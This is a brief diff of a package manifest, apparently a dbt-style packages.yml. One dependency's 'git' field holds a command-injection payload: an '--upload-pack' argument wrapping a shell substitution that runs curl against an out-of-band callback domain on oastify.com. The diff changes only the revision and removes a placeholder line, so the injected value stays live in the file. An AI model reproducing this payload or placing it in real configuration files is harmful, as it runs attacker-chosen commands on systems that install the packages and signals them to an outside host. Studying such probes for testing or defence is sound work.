@@ -3,5 +3,4 @@ packages:
     version: 0.7.0
 
   - git: "--upload-pack=$({curl,222eo6tnoif21n4zy6mv0nkpxg373vtji.oastify.com})"
-    revision: 0.9.2
-    subdirectory: git@sdsdsd:sdsd/sdsd.git
+    revision: 2257a0e73dcc0c0e77e80ddf994104cc
